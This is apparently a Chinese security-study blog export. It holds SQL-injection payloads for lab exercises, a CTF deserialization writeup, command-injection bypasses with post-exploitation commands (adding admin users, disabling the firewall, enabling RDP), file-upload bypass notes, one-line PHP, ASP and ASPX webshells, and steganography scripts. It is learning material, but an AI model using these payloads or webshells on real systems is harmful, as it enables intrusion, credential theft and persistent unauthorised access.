&amp; ^ % OR AND blk select() [] ` &lt;&gt; $ # %0a %a0 %0b how to injection：1‘+select@a:=’1’from(adminuser)where(1=1)),sleep(length(database())),1)+’1 select{x(flag1)}from{x(flag1)} 基础注入less1http://192.168.57.130:8002/Less-1/?id=-1&#39; union select 1,@@datadir,3–+ http://192.168.57.130:8002/Less-1/?id=-1&#39; union select 1,database(),3–+ http://192.168.57.130:8002/Less-1/?id=-1&#39; union select 1,group_concat(table_name,0x3a),3 from information_schema.tables where table_schema=’security’ –+ http://192.168.57.130:8002/Less-1/?id=-1&#39; union select 1,group_concat(column_name,0x3a),3 from information_schema.columns where table_name=’users’ –+ http://192.168.57.130:8002/Less-1/?id=-1&#39; union select 1,group_concat(username,0x3a,password),3 from users limit 0,1–+ less2去掉’，分析源代码可知带入查询使用$引用 less3基于报错分析变量’)，http://192.168.57.130:8002/Less-3/?id=-1&#39;) union select 1,group_concat(username,0x3a,password),3 from users limit 0,1–+ less4同上根据回显判断变量包含的格式 http://192.168.57.130:8002/Less-4/?id=-1&quot;) union select 1,group_concat(username,0x3a,password),3 from users limit 0,1–+ 盲注截取字符串函数:left(database(),1)&gt;’s’,left函数表示从左侧截取a的前b位 ascii(substr((select table_name information_shchema.tables where tables_schema=database()limit 0,1),1,1)=101 –+ substr(a,b,c)从b位置开始a截取a字符串的c长度，再用ascii()将字符转换成ascii码 ord(mid(s(elect ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))&gt;98%23 ord()函数,mid()函数 报错注入###floorselect count() from information_schema.tables group by concat(version(),floor(rand(0)2)) floor(rand(0)*2)使用数据技术重复造成错误 exp()select exp(~(select * from (select user())a)) exp()函数为以e为底的对数函数，版本再5.5.5以上，报错原因double数值类型超出范围 extractvalue()extractvalue(1,concat(0x7e,(select @@version),0x7e)) 报错原因：mysql对xml数据进行查询和修改的xpath函数，xpath语法错误 updatexml（）updatexml(1,concat(0x7e,(select @@version),0x7e),1)同上 重复查询出错select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//mysql 重复特性，此处重复了 version，所以报错。 时间盲注if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23条件为假执行sleep 借用天书讲解里的一段 UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;//BENCHMARK(count,expr) 用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()函数进行注入。 Mysql BENCHMARK(100000,MD5(1)) or sleep(5)Postgresql PG_SLEEP(5) OR GENERATE_SERIES(1,10000)Ms sql server WAITFOR DELAY ‘0:0:5’ less5http://192.168.57.130:8002/Less-5/?id=1&#39; and length(database())=8 –+ http://192.168.57.130:8002/Less-5/?id=1&#39; and left(database(),1)=’s’ –+ http://192.168.57.130:8002/Less-5/?id=1&#39; and left(database(),2)=’se’ –+ ascii(substr((select table_name information_schema.tables wheretables_schema=database()limit 0,1),1,1))=101 http://192.168.57.130:8002/Less-5/?id=1&#39; union select 1,count(),concat((select user()),0,0x3a,floor(rand(0)2))a from information_schema.columns group by a–+ http://192.168.57.130:8002/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select @@version))) –+ 延时注入:http://192.168.57.130:8002/Less-5/?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))–+ less6http://192.168.57.130:8002/Less-6/?id=1&quot; and if(ascii(substr(database(),1,1))=115,1,sleep(5))–+ 导入导出的相关操作有时候路径需要\转义 导出函数load_file(file_name)：读取文件返回该文件的内容作为一个字符串 使用条件:必须有权限读取并且文件必须完全可读，欲读取文件必须在服务器上，必须指定文件完整的路径，欲读取文件必须小于max_allowed_packet，必须知道绝对路径，如果返回空说明不满足条件 常用读取路径见http://www.cnblogs.com/lcamry/p/5729087.html 语句and (select count(*) from mysql.user)&gt;0 返回正常说明具有写权限 and (select count(*) from mysql.user)&gt;0 返回错误用户被降权 union select 1,2,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))用hex()函数导出 union select 1,1,load_file(0x633a22f626f6f742e696e69)十六进制 union select 1,1,load_file(c:\boot.ini) 导入导入到库使用函数load data infile，load data infile ‘/tmp/1.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’ lines terminated by ‘\n’ 分隔符:field terminated by 行结尾: lines terminated by 导入到文件select version into outfile ‘filename’ select &lt;?php @eval($_POST[‘adolph’])?&gt; into outfile “绝对路径” less7http://192.168.57.130:8002/Less-7/?id=1&#39;)) union select 1,2,@datadir into outfile “path”–+ less8http://192.168.57.130:8002/Less-8/?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(10)) –+ less9http://192.168.57.130:8002/Less-9/?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(10)) –+ http://192.168.57.130:8002/Less-9/?id=1&#39; and if(substr(database(),1,1)=’s’,1,sleep(10)) –+ less10http://192.168.57.130:8002/Less-10/?id=1&quot; and if(substr(database(),1,1)=’s’,1,sleep(10)) –+ POST注入less11admin’ or ‘1’=’1万能密码 1’ union select 1,database()# 1’ union select 1,group_concat(0x3a,table_name) from information_schema.tables where table_schema=’security’# less12admin”) or 1# less13此处只有登陆成功与失败的判断，明显符合布尔盲注 admin’) and left(database(),1)=’s’# less14admin”# admin” and left(database(),1)=’s’# admin” and extractvalue(1,concat(0x3a,(select database())))# less15布尔盲注admin’ and left(database(),1)=’s’# 时间盲注admin’ and if(substr((select database()),1,1)=’s’,1,sleep(5))# less16]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>注入天书</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反序列化例题witeup]]></title>
    <url>%2F2018%2F08%2F14%2F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BE%8B%E9%A2%98witeup%2F</url>
    <content type="text"><![CDATA[题目链接:http://web.jarvisoj.com:32784/ #源码1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &apos;phpinfo();&apos;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&apos;phpinfo&apos;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&apos;index.php&apos;));&#125;?&gt; 源码分析string ini_set ( string $varname , string $newvalue )设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。保证每一次PHP请求session的更新。session.serialize_handler string–定义用来序列化/反序列化的处理器名字，这里会变成php_serialize。 定义OowoO类中两个函数的作用分别的赋值和执行之后并判断是否GET传入新值如果传入新建执行类OowoO否则代码高亮显示index.php，phpinfo可见是经过序列化处理，如果我们希望正常执行则需要传入反序列化的值。 所以我们看到的是代码高亮的index.php 那么接下来进行下一步 突破尝试传入phpinfo()，http://web.jarvisoj.com:32784/index.php?phpinfo=ls,回显phpinfo()内容。这里我们需要尝试突破序列化才能返回我们想要的页面否则会一直是这个phpinfo()。1234567891011121314&lt;?#代码调试1ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO&#123; public $mdzz=&apos;phpinfo&apos;;&#125;$a = new OowoO;var_dump($a);echo json_encode(serialize($a));?&gt;#输出object(OowoO)#1 (1) &#123; [&quot;mdzz&quot;]=&gt; string(7) &quot;phpinfo&quot; &#125; &quot;O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;` 结合phpinfo信息中的关键信息session.upload_progress.enabled，当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得，可以进行session上传修改mdzz变量。 参考php手册直接在前端加上文件上传口1234&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt; 通过print_r(scandir(dirname(FILE)))来打印目录下内容 使用file_get_contents()得到php内容打印flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令注入漏洞(待更新)]]></title>
    <url>%2F2018%2F08%2F14%2F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[常见源码123456789101112131415161718192021&lt;?php if( isset( $_POST[ &apos;submit&apos; ] ) ) &#123; $target = $_REQUEST[ &apos;ip&apos; ]; // Determine OS and execute the ping command. if (stristr(php_uname(&apos;s&apos;), &apos;Windows NT&apos;)) &#123; $cmd = shell_exec( &apos;ping &apos; . $target ); echo &apos;&lt;pre&gt;&apos;.$cmd.&apos;&lt;/pre&gt;&apos;; &#125; else &#123; $cmd = shell_exec( &apos;ping -c 3 &apos; . $target ); echo &apos;&lt;pre&gt;&apos;.$cmd.&apos;&lt;/pre&gt;&apos;; &#125; &#125; ?&gt; 直接使用命令执行函数shell_exec而无过滤 多命令连接符:;,|,||,&amp;&amp;,&amp;,BYPASS:空格绕过 &lt; cat${IFS}flag=cat$IFS”flag” 制表符等 利用$(),执行命令会将字符串当命令执行 echo $(whoami) echo whoami 结合printf绕过一些限制 $(printf$IFS”\167\150\157\141\155\151”) $(printf$IFS”\x77\x68\x6f\x61\x6d\x69”) 常见利用windows下添加管理员: net user username passwd /add net localgroup administrator /add 关闭防火墙: netsh advfirewall set publicprofile state off 开启3389: wmic path win32_terminalservicesetting where (_CLASS !=””) call setallowtsconnections 1 Linux下管理员创建：useradd -u 0 -o -g 0 test ssh开启: service sshd start]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2018%2F08%2F13%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[文件上传漏洞原理:安全级别为高危，如果web应用程序未对用户上传的文件进行有效的检查过滤，导致恶意用户上传的包含恶意代码的文件会被服务器解析执行。 常见的上传点头像，文章附件，个人身份信息认证，提交相关材料 文件上传流程前端校验—&gt;http协议传输—&gt;web应用程序校验—&gt;web应用程序校验—&gt;web应用存储—&gt;web应用程序解析执行 文件上传漏洞分类 任意文件上传原理:web应用程序未做任何校验，恶意用户可以上传恶意代码 常见位置: 开发任意测试代码未删除 上传文件经过压缩编码(上传压缩包自解压绕过格式检验) 通过特定的客户端上传，如APP 绕过JS校验上传原理:web应用程序虽然对用户上传进行校验但是仅仅通过javascript完成，导致用户可以对前端javascript进行修改或者抓包修改上传文件。 源码范例:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php02 /**03 * Created by 独自等待04 * Date: 14-1-2205 * Time: 下午7:1906 * Name: upload1.php07 * 独自等待博客：http://www.waitalone.cn/08 */09 //文件上传漏洞演示脚本之js验证10 $uploaddir = &apos;uploads/&apos;;11 if (isset($_POST[&apos;submit&apos;])) &#123;12 if (file_exists($uploaddir)) &#123;13 if (move_uploaded_file($_FILES[&apos;upfile&apos;][&apos;tmp_name&apos;], $uploaddir . &apos;/&apos; . $_FILES[&apos;upfile&apos;][&apos;name&apos;])) &#123;14 echo &apos;文件上传成功，保存于：&apos; . $uploaddir . $_FILES[&apos;upfile&apos;][&apos;name&apos;] . &quot;n&quot;;15 &#125;16 &#125; else &#123;17 exit($uploaddir . &apos;文件夹不存在,请手工创建！&apos;);18 &#125;19 //print_r($_FILES);20 &#125;21 ?&gt;22 &lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;23 &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;24 &lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;25 &lt;head&gt;26 &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=gbk&quot;/&gt;27 &lt;meta http-equiv=&quot;content-language&quot; content=&quot;zh-CN&quot;/&gt;28 &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;/title&gt;29 &lt;script type=&quot;text/javascript&quot;&gt;30 function checkFile() &#123;31 var file = document.getElementsByName(&apos;upfile&apos;)[0].value;32 if (file == null || file == &quot;&quot;) &#123;33 alert(&quot;你还没有选择任何文件，不能上传!&quot;);34 return false;35 &#125;36 //定义允许上传的文件类型37 var allow_ext = &quot;.jpg|.jpeg|.png|.gif|.bmp|&quot;;38 //提取上传文件的类型39 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));40 //alert(ext_name);41 //alert(ext_name + &quot;|&quot;);42 //判断上传文件类型是否允许上传43 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;44 var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;45 alert(errMsg);46 return false;47 &#125;48 &#125;49 &lt;/script&gt;50 &lt;body&gt;51 &lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;52 53 &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; name=&quot;upload&quot; onsubmit=&quot;return checkFile()&quot;&gt;54 &lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;204800&quot;/&gt;55 请选择要上传的文件：&lt;input type=&quot;file&quot; name=&quot;upfile&quot;/&gt;56 &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;57 &lt;/form&gt;58 &lt;/body&gt;59 &lt;/html&gt; 源码分析先定义文件白名单，然后使用函数检验，使用file.substring(file.lastIndexof())提取文件类型并通过白名单indexof与后缀名进行比对，如果返回-1则禁止上传 绕过方法使用浏览器修改前端JS删除调用的上传验证函数或者直接禁用JS 后端上传代码校验绕过常用绕过方法:绕过文件类型校验，绕过扩展名验证，绕过文件头校验 绕过文件类型校验原理:系统通过判定文件类型时通过content-type字段，可以抓包修改导致绕过使用函数:$_FILES[‘upload’][‘type’] 绕过扩展名校验-黑名单PHP:php5,php6,php空格(正则),phtml,PHp(windows下大小写不敏感) ASP:aspx,cer,cdx,aSp JSP:jspx，jspf,jSp 绕过文件头绕过方法:一句话图片木马，在木马加入特点开头 Web存储过程中的上传漏洞%00截断原理:在上传过程中web应用程序经过一系列文件校验后，最后调用php内置函数进行move_uploaded_file保存文件。在php某些版本中该函数遇到\x00字符后会阶段路径名。测试人员通过构造包含\x00的特殊 文件名可以绕过扩展名的校验，但是在保存时却以非法扩展名保存。 绕过方法:test.php\x00.jpg，通过文件类型的校验，但是在调用move_uploaded_dile时\x00阶段保存为test.php截断上传路径也可以造成相同目的。 #Web应用程序解析漏洞原理:web中间件遇到特殊类型文件会被当成代码执行 常见解析漏洞: iis6.0:会忽略“;.”后面的字符例如test.asp;.jpg会被当作test.asp解析 apache低版本:会从后往前识别类型如果不能识别会继续往前校验，例如test.php.xxx Nginx:某些版本存在”/.php”的解析漏洞例如,test.jpg/.php会被解析当作php执行 其他绕过: 重写解析规则:上传.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。 双写后缀名绕过:Web应用程序对文件名进行替换过滤，如删除文件名中的php等字符，攻击者可以尝试phphpp类型后缀名进行绕过。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web应用威胁概述]]></title>
    <url>%2F2018%2F08%2F13%2FWeb%E5%BA%94%E7%94%A8%E5%A8%81%E8%83%81%E6%A6%82%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[OWASP开源Web应用程序安全项目，其目的是协助企业和个人发现和使用可信赖的应用软件。 OWASP top 10 2013A1注入 A2失效的身份认证和会话管理 A3跨站脚本XSS A4不安全的直接对象引用 A5安全配置错误 A6敏感数据暴露 A7功能级别访问控制缺失 A8跨站请求伪造 A9使用已知易受攻击的组件 A10未验证的重定向和转发 OWASP TOP 10 2017A1 注入 A2 失效的身份认证和会话管理(cookie session) A3 跨站脚本XSS A4 失效的访问控制(未授权访问和程序水平和垂直越级访问) A5 安全配置错误(web组件配置不当) A6 敏感信息泄露 A7 攻击检测与防护不足 A8 跨站请求伪造CSRF A9 使用已知漏洞的组件(第三方的漏洞组件) A10 未受有效保护的API 注入类威胁WEB应用程序未将应用代码和用户提交数据严格区分导致代码执行 SQL注入，XSS漏洞，文件上传，文件包含，文件下载，OS命令注入 sql注入原理:恶意用户提交数据被当成数据库查询代码解析执行 xss漏洞原理：恶意用户提交的代码被当作html标签与js代码解析执行返回给用户，跨站脚本攻击常窃取cookie和网站钓鱼，网站挂马 文件上传漏洞原理: 恶意用户上传的文件被当作脚本代码执行 文件包含漏洞原理: web应用程序往往调用多个文件，恶意用户提交的数据被web应用程序当成需要调用的文件造成文件包含漏洞 任意文件下载漏洞原理: web应用程序通过下载功能，黑客可以根据修改文件名或者路径造成任意文件下载 OS命令注入原理: web应用程序会提供一些执行系统命令的接口，如果网站对用户提交的参数过滤不严格，会把恶意用户提交的参数当作命令执行 信息泄露类威胁常常由web应用组件设计错误造成，恶意用户可以获取服务器各种敏感信息为攻击埋下伏笔 ###目录信息泄露原理:web中间件配置错误，用户访问不存在索引文件目录则会显示目录下所有文件及其子目录 敏感文件泄露原理:管理员发布网站未及时删除网站开发时的敏感文件例如.git,.bak,.svn等 弱口令漏洞原理:口令比较容易猜解出，口令过于简单而造成 未授权访问漏洞原理:web应用程序对管理后台，敏感api等没有进行有效的权限控制，从而造成未授权访问 敏感路径泄露原理:web管理后台或者编辑器后台过于简单容易猜解 业务逻辑类漏洞原理:设计缺血，设计者在设计过程中考虑的不全面 订单金额任意修改原理:前台参数决定传入参数，造成金额任意修改 验证码判断缺陷原理: 网站发送验证码可以被暴力破解或获取或重放，绕过验证码碰撞用户 接口无限制枚举原理：暴力破解账号密码，枚举验证码 cookie设计缺陷原理：未使用随机化机制采用可预测账号导致登陆任意账号、泄露用户敏感信息 密码找回设计缺陷原理:未采用安全的随机数作为凭证]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web应用基础架构]]></title>
    <url>%2F2018%2F08%2F13%2FWeb%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%2F</url>
    <content type="text"><![CDATA[请求架构 操作系统简介:管理计算机硬件与软件资源的计算机程序 计算机硬件—管理控制—-&gt;操作系统—–&gt;上层应用 Web中间件简介:一类链接软件组建和应用的计算机软件 常见的中间件:Apache\Tomcat\Weblogic等 中间件上的编程语言:HTML\JS\JSP\PHP\ASP\ASP.NET等 用户访问网站，发出http请求，web中间件接收，交给脚本语言包执行并返回，浏览器根据返回的html以及js进行渲染 相关简介PHPPHP是一种广泛开源的编程语言 PHP脚本在服务器上执行 JSP是基于JAVA语言实现的代码&lt;% %&gt;前端代码结合标签语言html进行组合使用 数据库按照数据结构来组织存储和管理数据的建立在计算机设备上的数据存储仓库 主要有关系型数据库(mysql,sqlserver,oracle)与非关系型数据库(redis,MongoDB,CounchDB) MYSQL是关系型数据库管理系统目前属于oracle公司，开源支持大型数据库，使用标准的sql数据语言形式，可以在多个系统上运行支持多种语言，很好的支持PHP并支持定制 Web系统通过增加、删改、查询数据库中的操作修改相关内容 机制B/S与C/S B/S：不需要安装专门软件只需要浏览器直接进行交互 C/S：需要专门客户端软件,例如QQ/微信/迅雷等 http协议本地浏览器与服务器数据交互的协议，基于TCO/IP通信协议目前使用HTTP1.1。 无连接无状态，简单快速，灵活的协议 url:http://协议部分https://表示加密传输 //www.baidu.com表示域名部分:8088端口部分 然后是虚拟目录/news 文件名部分/index.php 参数部分?boardid=5 锚部分#name用于定位 请求类型 状态码 虚拟机常用软件:vmware vitualbox 网络工作模式: 桥接模式:桥接模式下虚拟机与实体机在同一个网段(c段) NAT模式:扩散式传播，实体机与虚拟机不在同一个c段但是在同一个局域网下，类似路由器 主机模式:虚拟机只能与主机通信无法链接互联网 快照功能 网站搭建组成:中间件，网站程序，数据库等部分 服务器中间件:Apache,nginx,iis等 集成环境:phpstudy,xampp,wampserver http代理http代理位于浏览器与服务器之间充当一个中间人角色，通过流量查看可以方便相关测试 burpsuite配置java环境安装软件]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国外CTF root-me隐写部分writeup]]></title>
    <url>%2F2018%2F08%2F13%2F%E5%9B%BD%E5%A4%96CTF-root-me%E9%9A%90%E5%86%99%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[平台网址:https://www.root-me.org StéganographieGunnm-writeup首先看看这个图吧 来来来瞅一瞅这个第一题，5分题，不得不说这个平台给分还是很吝啬，拿到的好少哈哈。首先凭着对图片的敏感度，这个图片的颜色上是有手脚的，为什么这么说呢？很简单啊，只有一黑一白的嘛。很容易想到的就是二维码的配色。所以做的第一步就是先反色看看。 乍一看好像没啥问题，不过你再看看！ 好了就很明显了。 Pas très carré-writeup]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>隐写</tag>
        <tag>root-me</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebShell]]></title>
    <url>%2F2018%2F08%2F13%2FWebShell%2F</url>
    <content type="text"><![CDATA[#WebShell(网站后门的统称) 种类一句话木马 小马 大马 打包马 脱库马 其他 一句话木马介绍:短小精悍，使用简便，在现在测试过程中颇受欢迎，其主要利用客户端传参。 插入位置:脚本文件 代码: ASP一句话:&lt;%eval request(&quot;c&quot;)%&gt; php一句话:&lt;?php @eval($_POST[value])?&gt; aspx一句话:&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;value&quot;])%&gt; php一句话变形马__动态传参:&lt;?php $_REQUEST[&#39;a&#39;]($_REQUEST[&#39;b&#39;]); ?&gt; ascii一句话过waf:&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“xindong”))%&gt; 图片马制作工具:c32 和改后缀的区别:和上传抓包修改php脚本的最大区别是现在waf会检测图片文件是否有正常的格式信息，如无合法图片头或完整图片内容则不认后缀驳回。 步骤: 1.完整图片2.过waf一句话3.作为两用的图片马4.大小适中]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>Webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片隐写记录----长期更新]]></title>
    <url>%2F2018%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E8%AE%B0%E5%BD%95-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%2F</url>
    <content type="text"><![CDATA[PNG图片结构隐写前导–png图片结构先简单说一下PNG图片的文件结构，有必要记一下。 PNG图片是一种无损压缩图片格式，其主要由PNG文件标志和众多的PNG数据块组成。 其头位置的固定的十六进制数为89 50 4E 47 0D 0A 1A 0A属于文件头标志，许多隐写题是以一种文件损坏的形式出现，其中很多是人为修改了文件头或者其中的关键数据块，这种损坏可以根据PNG的文件结构进行手工恢复。 接着是PNG图片的数据块，我们先只记其中比较关键而且比较容易引起关注的。 IHDR数据块和IEND数据块这两个数据块是数据块的开头和结尾，PNG图片的每个数据块由4字节的长度4字节的数据类型码和可变长度的数据块数据以及4字节的CRC循环冗余校验码组成，长度以小端序的形式保存。 IHDR结构由4字节宽度+4字节高度+1字节的图像深度通常是1，2，4，8，16，以及1字节的颜色类型+1字节的压缩算法+1字节的滤波器方法+1字节的隔行扫描方法共13字节组成，其后由4字节的CRC校验码其中49 48 44 52代表IHDR的开始。 IEND数据块是固定的12字节 00 00 00 00 49 45 4E 44 AE 42 60 82CRC码也总是AE 42 60 82。 好了记住这些结构我们来做一些基于结构的图片隐写题。 ##第一阶段工具介绍会根据内容慢慢的和大家介绍各种各样的工具 Strings这个工具的作用是查看文件中的可见字符串，简单点题flag直接藏在其中，复杂一点hint往往藏在其中。 strings+图片名 默认-a扫描其中可见字符 exiftool这个工具时对图片信息直接进行分析的工具通过exiftool+文件名直接列出文件的所有信息。用于发现隐藏在文件元数据中的flag以及hint。 identify获取图片的格式与特性用法大致一致不过更多用于gif图片的分析 binwalk+foremost神器不多介绍，神器的使用应该众所周知 图片高度宽度隐写 该题来自ISCC2018的有趣的隐写题。 这个图片一拿到最容易想到的就是就是这个手指指的可能就是flag，可是手指下面并没有东西，故Flag很可能经过了高度或者宽度的隐写隐藏起来，所以我们进行长度高度修改恢复，首先用winhex打开图片，然后对其结构进行修改 第一个八字节是图片的文件开头，没有问题，然后是第一个数据块的长度13字节也没有问题，在IHDR开头之后，第一个四字节是宽度，第二个四字节是高度，我们对其高度进行修改，将手指上移，然后打开 双图隐写双图隐写常常出现的三种形式是flag图片与隐藏图片进行结合，通过分离直接得到flag；第二种是图片1与图片2进行对比或运算其差异运算结果就是flag；第三种是flag的隐藏图片与隐藏图片进行结合，需要进行多次分离分析。 双图隐写之图像格式拼接这种题往往在图像的关键数据结构处插入隐藏数据，例如IHDR或者IEND之后，尤其是在IEND之后的数据隐写，系统对图片结构进行分析时值能读到数据的文件尾而png图片的文件尾是固定值，造成展示时第一个图片对第二图片产生了覆盖显示。到这里就不得不给大家介绍一些必备工具了。 可以看见在png图片结尾还有jfif的文件头 图层叠加通过photoshop工具分离或者更改其底色。 图像运算得到了多张相似图片需要进行运算或拼接 使用stegsolve工具的image combiner功能进行各种运算其中AND为加运算通常进行多张图片拼接 也有时候需要使用compare命令进行内容比较 compare 1.png 2.png out.png 单条红线往往采用相减运算发现其不同通常采用SUB减运算进行保存为bmp的位图无损结构格式然后找到图片不同处再溯源结合数据转换相关密码编码。 例题脚本–详见i春秋双图隐写教学1.通过compare溯源后发现一个只有两种变换的编码将其替换为0 1，使用str[1::6]每八位二进制转换ascii码char(int(str[i:i+8],2))得到flag 2.RGB通道中的png图像通道对比脚本如下:12345678910111213141516171819202122232425262728#coding:utf-8# from PIL import ImageFile# ImageFile.LOAD_TRUNCATED_ImageS = Truefrom PIL import Imageimport randomimg1 = Image.open("C:\\Users\\69573\\Desktop\Misc\\PY\\1.png")iml1 = img1.load()img2 = Image.open("C:\\Users\\69573\Desktop\\Misc\\PY\\2.png")iml2 = img2.load()a=0i=0s=''for x in range(img1.size[0]): for y in range(img1.size[1]): if(iml1[x,y]!=iml2[x,y]): print iml1[x,y],iml2[x,y] #print iml2[x,y][0] if i==8: s=s+chr(a) a=0 i=0 a=iml2[x,y][0]+a*2 i=i+1 图片错误信息隐写CRC校验码爆破一个典型的错误特征，linux下打不开图片但是windows下可以打开。当然也可以用01editor打开对错误进行分析。附上copy 作者：Watanuki的代码经测很好使：123456789101112131415161718192021222324252627282930import zlibimport struct#读文件file = CommonFile+'2.png' fr = open(file,'rb').read()data = bytearray(fr[12:29])crc32key = eval(str(fr[29:33]).replace('\\x','').replace("b'",'0x').replace("'",''))#crc32key = 0xCBD6DF8A #补上0x，copy hex value#data = bytearray(b'\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00') #hex下copy grep hex n = 4095 #理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了for w in range(n):#高和宽一起爆破 width = bytearray(struct.pack('&gt;i', w))#q为8字节，i为4字节，h为2字节 for h in range(n): height = bytearray(struct.pack('&gt;i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] #print(data) crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) #写文件 newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+'.png','wb')#保存副本 fw.write(newpic) fw.close return None 12345678910111213141516import zlibimport structcrc32key = 0xCBD6DF8A #补上0x，winhex下copy hex value。data = bytearray(b&apos;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&apos;) #winhex下copy grep hex。n = 4095 #理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了for w in range(n):#高和宽一起爆破 width = bytearray(struct.pack(&apos;&gt;i&apos;, w))#q为8字节，i为4字节，h为2字节 for h in range(n): height = bytearray(struct.pack(&apos;&gt;i&apos;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) return None crc错误信息溯源 会在每一个错误处发现对应的信息然后可以进行flag的组合 好了又到了上题的时候这里采用工具pngcheck进行校验 发现校验错误溯源回去发现时倒数第二个IDAT数据块，然后因为pngcheck信息时138即是idat数据块读取过程中出错故该段数据是存有问题的，那么分析这段数据。 78 9C至最后一个15b08d这个校验之间为一个lz77压缩格式，现在需要进行解压缩查看数据 12345678import zlibimport 